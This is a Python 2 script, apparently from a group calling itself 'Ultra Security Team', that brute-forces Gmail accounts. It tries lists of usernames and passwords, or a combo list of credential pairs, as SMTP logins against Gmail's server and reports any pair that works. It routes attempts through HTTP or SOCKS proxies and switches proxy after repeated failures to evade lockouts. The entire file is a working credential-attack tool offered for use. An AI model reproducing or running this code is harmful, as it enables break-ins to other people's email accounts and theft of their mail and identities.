#!/usr/bin/env python
# -*- coding: UTF-8 -*-

# 	Ultra Security Team

#  Telegram: @ultrasecurity
#  Website : https://ultrasec.org

"""
copyrigth(c) 2018 ultra security team
author: siruidops
:D 
"""

import smtplib
import socks
import sys
from color import *
import os
import time
from socks import *

ATTACK_NUMBER_ERROR = 0
def run(usernames,passwords,comboAttack=False):
	if comboAttack:
		combo(usernames,passwords)
		sys.exit()
	else:
		pass
	print
	print green+" [*] Username: %s %s"%(usernames,end)
	print yellow+" [*] Status attack ..."+end
	global emails
	global passwds
	emails = usernames.split('\n')
	passwds = passwords.split('\n')
	proxy()

def combo(usernames,passwords):
	ATTACK_NUMBER_ERROR = 0
	print
	print green+" [*] Combo List Loaded !"+end
	print yellow+" [*] Status attack ..."+end
	global emails
	global passwds
	emails = usernames.split('\n')
	passwds = passwords.split('\n')
	proxy(comboT=True)
	users = emails
	for user in emails:
		passwd = passwds[emails.index(user)]
		users.remove(user)
		passwds.remove(passwd)
		user = user.strip()
		passwd = passwd.strip()
		if ATTACK_NUMBER_ERROR == 10:
			proxy(comboT=True)
			ATTACK_NUMBER_ERROR = 0
		else:
			ATTACK_NUMBER_ERROR += 1
		try:
			server = smtplib.SMTP('smtp.gmail.com',587)
			server.starttls()
			server.ehlo()
			server.login(user,passwd)
			sys.exit(green+"\n Found (%s%s%s) [%s%s%s] %s"%(yellow,user,green,yellow,passwd,green,end))
		except KeyboardInterrupt:
			sys.exit(red+" Bye :D ..."+end)
		except smtplib.SMTPAuthenticationError:
			print red+" Invalid (%s%s%s) [%s%s%s]%s"%(yellow,user,red,yellow,passwd,red,end)
			continue
		except:
			proxy(comboT=True)
	
def proxy(comboT=False):
	ATTACK_NUMBER_ERROR = 0
	print
	print green+"	Do you want to use a proxy?"+end
	print
	print "	%s1) %sYes            %s2) %sNo%s"%(pur,blue,pur,blue,end)
	print
	try:
			re = raw_input("%sultrabrute%s@%sultrasec%s:/%saccount%s/%sgmail%s# "%(green,end,pur,end,pur,end,pur,end))
	except KeyboardInterrupt:
			sys.exit(red+'Bye :D ...'+end)
	if re == '1':
		os.system('clear')
		print
		print green+"	Please select a proxy type"+end
		print
		print "	%s1) %sHTTP            %s2) %sSOCKS 5"%(pur,blue,pur,blue)
		print "    %s3) %sSOCKS 4         %s4) %sNoProxt%s"%(pur,blue,pur,blue,end)
		print
		try:
			re = raw_input("%sultrabrute%s@%sultrasec%s:/%saccount%s/%sgmail%s# "%(green,end,pur,end,pur,end,pur,end))
		except KeyboardInterrupt:
			sys.exit(red+'Bye :D ...'+end)
		print 
		print green+"	Please enter your proxy (example: 0.0.0.0:8080)"+end
		print
		try:
			proxies = raw_input("%sultrabrute%s@%sultrasec%s:/%saccount%s/%sgmail%s# "%(green,end,pur,end,pur,end,pur,end))
		except KeyboardInterrupt:
			sys.exit(red+'Bye :D ...'+end)
		if ':' in proxies:
			buffer = proxies.split(':')
			ipProxy = buffer[0]
			portProxy = buffer[-1]
		else:
			sys.exit(red+' Proxy invalid: Bye :D ...'+end)
		if re == '1':
			# HTTP
			socks.setdefaultproxy(PROXY_TYPE_HTTP,ipProxy,portProxy)
			socks.wrapmodule(smtplib)
		elif re == '2':
			# SOCKS 5
			socks.setdefaultproxy(PROXY_TYPE_SOCKS5,ipProxy,portProxy)
			socks.wrapmodule(smtplib)
		elif re == '3':
			# SOCKS 4
			socks.setdefaultproxy(PROXY_TYPE_SOCKS4,ipProxy,portProxy)
			socks.wrapmodule(smtplib)
		elif re == '4':
			if comboT:
				pass
			else:
				attack(emails,passwds)
	else:
		if comboT:
			pass
		else:
			attack(emails,passwds)
def attack(users,passwds):
	ATTACK_NUMBER_ERROR = 0
	for user in users:
		user = user.strip()
		users.remove(user)
		for passwd in passwds:
			time.sleep(3)
			if ATTACK_NUMBER_ERROR == 10:
				proxy()
			else:
				ATTACK_NUMBER_ERROR += 1
			passwd = passwd.strip()
			passwds.remove(passwd)
			try:
				server = smtplib.SMTP('smtp.gmail.com',587)
				server.starttls()
				server.ehlo()
				server.login(user,passwd)
				sys.exit(green+"\n Found (%s%s%s) [%s%s%s] %s"%(yellow,user,green,yellow,passwd,green,end))
			except KeyboardInterrupt:
				sys.exit(red+" Bye :D ..."+end)
			except smtplib.SMTPAuthenticationError, error:
				if not 'not accepted' in str(error):
					sys.exit(green+"\n Found (%s%s%s) [%s%s%s] %s"%(yellow,user,green,yellow,passwd,green,end))
				else:
					print red+" Invalid (%s%s%s) [%s%s%s]%s"%(yellow,user,red,yellow,passwd,red,end)
					continue
				print error
			except:
				proxy()
